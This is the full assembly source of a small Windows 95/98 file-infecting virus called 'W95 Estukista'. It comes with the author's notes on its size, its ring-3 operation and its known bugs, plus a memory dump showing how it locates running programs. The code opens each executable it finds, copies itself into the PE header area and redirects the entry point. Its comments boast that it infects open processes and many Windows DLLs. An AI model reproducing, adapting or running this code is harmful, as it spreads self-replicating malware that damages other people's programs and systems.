
;--------------------------------  W95 ESTUKISTA BY HenKy -----------------------------
;
;-AUTHOR:        HenKy
;
;-MAIL:          HenKy_@latinmail.com
; 
;-ORIGIN:        SPAIN
; 

;                            VIRUS_SIZE = 126 BYTES!!!!

 ; 100% FUNCTIONAL UNDER W95/98 !!!!! AND IS RING 3!!!!!! 
      
 ; (NOT TESTED UNDER ME)

 ; INFECTS *ALL* OPEN PROCESES AND EVEN ALL DLL AND MODULES IMPORTED BY THEM
 
 ; THE 0C1000000H ADDRESS IS USED AS BUFFER BECOZ WE HAVE WRITE/READ PRIVILEGES

 ; THE BFF712B9h ADDRESS IS THE CALL VINT21 

 ; THE INITIAL ESI VALUE POINTS TO A READABLE MEMORY ZONE (SEEMS TO BE A CACHE ONE

 ; WHERE WINDOWS LOADS THE PE HEADER, THE IMPORTANT THING IS THAT HERE U CAN FIND

 ; THE FILENAMES WITH COMPLETE PATH OF ALL OPEN PROCESES)


;BUGS:  * THE BAD THING IS THAT ESI INITIAL VALUE ON SOME FILES POINTS TO KERNEL, CAUSING
;         THAT NO FILENAME FOUND (VIRUS WILL INFECT NOTHING AND WILL RETURN TO HOST).

;        * ANOTHER POSSIBLE BUG IS THAT 0C1000000H MAYBE NOT READ/WRITE ON ALL COMPUTERS
;         (AT LEAST IN MY W95 AND W98 WORKS FINE, AND INTO COMPUTER'S FRIEND WITH 98 WORKS TOO)

;        * AND THE MORE PAINLY THING IS THE MASK LIMIT.... IF VERY LOW-> LESS INFECTIOUS
;          IF VERY HIGH-> RISK OF READ NON-MAPPED AREA (AS WE ARE IN RING 3 IT WILL HANG WINDOZE)

; ANYWAY IN MY TESTS A LOT OF FILES BECOME INFECTED , MANY OF THEM WINDOWS DLL'S


;DUMP OF INITIAL ESI VALUE OF MY COMPILED BINARY (I HAVE AN OPEN PROCESS CALLED AZPR.EXE)



;81621788 FF FF FF FF 04 00 00 00 00 00 00 00 00 00 00 00 ÿÿÿÿ               
;81621798 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     
;816217A8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     
;816217B8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     
;816217C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     
;816217D8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     
;816217E8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     
;816217F8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     
;81621808 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     
;81621818 00 00 00 00 00 00 00 00 20 00 00 A0 43 3A 5C 57             C:\W    
;81621828 49 4E 50 52 4F 47 5C 41 5A 50 52 5C 41 5A 50 52 INPROG\AZPR\AZPR    
;81621838 2E 45 58 45 20 00 00 00 48 00 00 A0 44 00 00 00 .EXE    H   D       

; ....

;81621CD8 50 A0 D7 82 3C 02 00 A0 50 45 00 00 4C 01 08 00 P ×‚<  PE  L    
;81621CE8 A0 95 37 39 00 00 00 00 00 00 00 00 E0 00 82 01  •79        à ‚    
;81621CF8 0B 01 02 12 00 22 02 00 00 A8 00 00 00 50 05 00  "  ¨   P     
;81621D08 01 40 0B 00 00 10 00 00 00 40 02 00 00 00 40 00 @     @   @     
;81621D18 00 10 00 00 00 02 00 00 01 00 0B 00 00 00 00 00                 
;81621D28 04 00 00 00 00 00 00 00 00 90 0C 00 00 04 00 00                 
;81621D38 00 00 00 00 02 00 00 00 00 00 04 00 00 00 01 00                  
;81621D48 00 20 00 00 00 10 00 00 00 00 00 00 10 00 00 00                   
;81621D58 00 00 00 00 00 00 00 00 64 54 0B 00 D4 01 00 00         dT Ô      
;81621D68 00 A0 08 00 00 94 02 00 00 00 00 00 00 00 00 00     ”             
;81621D78 00 00 00 00 00 00 00 00 CC 52 0B 00 08 00 00 00         ÌR        
;81621D88 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     
;81621D98 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     
;81621DA8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     
;81621DB8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     
;81621DC8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 00                    
;81621DD8 2E 74 65 78 74 00 00 00 00 30 02 00 00 10 00 00 .text    0        
;81621DE8 00 C0 00 00 00 04 00 00 00 00 00 00 00 00 00 00  À                 
;81621DF8 00 00 00 00 40 00 00 C0 2E 69 64 61 74 61 00 00     @  À.idata      
;81621E08 00 20 00 00 00 40 02 00 00 04 00 00 00 C4 00 00      @     Ä      
;81621E18 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0             @  À    

; ....

;81621E38 00 1C 00 00 00 C8 00 00 00 00 00 00 00 00 00 00     È              
;81621E48 00 00 00 00 40 00 00 C0 2E 62 73 73 00 00 00 00     @  À.bss        
;81621E58 00 50 05 00 00 00 03 00 00 50 05 00 00 00 00 00  P     P         
;81621E68 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0             @  À    
;81621E78 2E 72 65 6C 6F 63 00 00 00 50 00 00 00 50 08 00 .reloc   P   P     
;81621E88 00 00 00 00 00 E4 00 00 00 00 00 00 00 00 00 00      ä              
;81621E98 00 00 00 00 40 00 00 C0 2E 72 73 72 63 00 00 00     @  À.rsrc       
;81621EA8 00 A0 02 00 00 A0 08 00 00 9A 01 00 00 E4 00 00        š  ä      
;81621EB8 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0             @  À    
;81621EC8 61 73 70 72 00 00 00 00 00 40 01 00 00 40 0B 00 aspr     @  @     
;81621ED8 00 3A 01 00 00 7E 02 00 00 00 00 00 00 00 00 00  :  ~             
;81621EE8 00 00 00 00 50 08 00 C0 2E 64 61 74 61 00 00 00     P À.data       
;81621EF8 00 10 00 00 00 80 0C 00 00 00 00 00 00 B8 03 00     €      ¸     
;81621F08 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0             @  À    
;81621F18 40 00 00 A0 00 00 00 00 E0 1C 62 81 FF FF FF FF @       àbÿÿÿÿ    
;81621F28 E0 13 62 81 F0 13 62 81 18 00 08 00 8F 02 00 00 àbðb        
;81621F38 08 00 00 00 00 00 00 00 00 00 40 00 D7 2B 01 00          @ ×+     
;81621F48 30 23 62 81 5C 1F 62 81 18 00 6C 1F 62 81 08 00 0#b\b lb     
;81621F58 20 00 00 A0 43 3A 5C 57 49 4E 50 52 4F 47 5C 41     C:\WINPROG\A    
;81621F68 5A 50 52 5C 41 5A 50 52 2E 45 58 45 00 CC CC CC ZPR\AZPR.EXE ÌÌÌ    
;81621F78 B4 03 00 A0 4E 45 01 00 00 00 00 00 00 00 8C 03 ´  NE       Œ  

; ....  


.586P
PMMX       ; WORF...  ... JEJEJE
.MODEL FLAT
LOCALS

EXTRN    ExitProcess:PROC
MIX_SIZ  EQU  (FILE_END - MEGAMIX)

MACROSIZE   MACRO		            
            DB      MIX_SIZ/00100 mod 10 + "0"
            DB      MIX_SIZ/00010 mod 10 + "0"
            DB      MIX_SIZ/00001 mod 10 + "0"
            ENDM    
.DATA
        
 DB 0  

 DB 'SIZE = ' 
     MACROSIZE                

.CODE

       
MEGAMIX: 
         ; EAX: EIP
         ; ESI: BUFFER
         

VINT21:             
        DD 0BFF712B9h   ; MOV ECX,048BFF71H  ;-) Z0MBiE
        DB 'H'          ; HenKy ;P
        XCHG EDI, EAX   ; EDI: DELTA
        MOV  EDX,ESI    ; EDX=ESI: CACHE BUFFER   (ESPORE BUG)
        MOV  ESI,0C1000000H  ; ESI: MY DATA BUFFER
        MOV  EBP,EDI    ; NOW: EBP=EDI=DELTA=INT21H

        ;EDX: POINTER TO FNAME

        ;LEA EDX,POPOPOP ; FOR DEBUG ONLY
        ;JMP KAA

        MOV ECX,28000 ; LIMIT 
        PUSHAD

AMIMELASUDA:

        POPAD
PORK:   
        INC EDX
        CMP WORD PTR [EDX],':C'
        JE KAA
        LOOP PORK


WARNING:
        PUSH 00401000H ; ANOTHER ESPORE BUG CORRECTED :)
        RET
   
KAA:    
        PUSHAD
        MOV AX, 3D02h      ; open                 
        CALL [EDI]                  
        JC   AMIMELASUDA    
        XCHG EBX, EAX               
        MOV EDX,ESI
        XOR ECX,ECX
        MOV CH,4H
        MOV  AH, 3Fh      ;read          
        CALL  [EDI]          
        MOV  EAX, [EDX+3Ch]
        ADD  EAX,EDX
        MOV  EDI,EAX
        PUSH 32
        POP  ECX
         
 DEPOTA:
        INC EDI
        CMP BYTE PTR [EDI],'B'; HEHEHEHE
        JE  GOSTRO
        JMP DEPOTA
 GOSTRO:
        INC  EDI
        PUSH EDI
        MOV  ESI,EBP
        REP  MOVSD
        MOV  ESI,EDI
        POP  EDI
        SUB  EDI,EDX
        XCHG DWORD PTR [EAX+28H],EDI
        CMP  DI,1024
        JB   CLOZ
        ADD  EDI,[EAX+34H]
        XCHG DWORD PTR [ESI-MONGORE],EDI

        PUSH EBP
        POP  EDI
        XOR  EAX,EAX 
        PUSHAD                            
        MOV AH, 42h                     
        CDQ                            
        CALL [EDI]                        
        POPAD        
        MOV CH,4H
        MOV AH,40H ; write        
        CALL [EDI]
CLOZ:  
        MOV AH,3EH ; close
        CALL [EDI]
        JMP AMIMELASUDA
        
FILE_END:

        DW 0   ;-P

MONGORE EQU 95 ; OLD_EIP

        PUSH 0
        CALL ExitProcess

;POPOPOP DB "H:\PRUEBAS\TEST.ZZZ",0

END MEGAMIX
